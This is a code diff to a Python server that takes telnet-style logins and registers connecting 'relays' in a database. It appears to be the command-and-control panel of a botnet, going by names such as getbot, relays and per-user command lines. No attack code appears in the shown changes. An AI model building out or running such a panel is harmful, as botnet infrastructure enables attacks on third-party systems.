@@ -74,7 +74,9 @@ def find_login(
 def handle_client(
     client: Sock,
     address: tuple[str, int],
+    loops: Loops,
 ) -> None:
+    # trying to get username
     while 1:
         send(client, config.ANSI_CLEAR, False)
         send(client, f'{config.COLOR_WHITE}Username > ', False)
@@ -83,6 +85,7 @@ def handle_client(
             continue
         break
 
+    # sending password request to client
     password = ''
     while 1:
         send(client, config.ANSI_CLEAR, False)
@@ -93,6 +96,7 @@ def handle_client(
 
         break
 
+    # if this is a client and not a relay
     if password != config.RELAY_KEY:
         send(client, config.ANSI_CLEAR, False)
 
@@ -107,13 +111,23 @@ def handle_client(
         Thread(target=client_loops.update_title, args=[client, username]).start()
         Thread(target=client_loops.command_line, args=[client, username]).start()
 
+    # here, a new relay try to connect
     else:
         for addr in config.relays_sock.values():
-            print("already knewed relay:", addr)
             if addr[0] == address[0]: # so same ips
                 client.close()
                 return
 
+        # new relay here
+        relay: Relay = Relay.new(address[0])
+        print(client, address, relay)
+
+        # try to insert the relay in database, if not working, don't accept it
+        if not loops.edit_relay(relay, "insert"):
+            client.close()
+            return
+        
+        config.relays.append(relay)
         config.relays_sock.update({client: address})
 
 def main() -> None:
@@ -146,7 +160,7 @@ def main() -> None:
 
     if  (status:=rget(f"{config.API_URL}/version?urlkey={config.URL_KEY}").status_code) == 200: pass
     else:
-        log(f'Failed to connect to api, (status={status})')
+        log(f'Failed to connect to api (status={status})')
         exit()
 
     s.listen()
@@ -155,7 +169,7 @@ def main() -> None:
     Thread(target=loops.net).start()
     Thread(target=loops.getbot).start()
 
-    while 1: Thread(target=handle_client, args=[*s.accept()]).start()
+    while 1: Thread(target=handle_client, args=[*s.accept(), loops]).start()
 
 if __name__ == '__main__':
     print(f"\nLegit: {__legit__}\n")
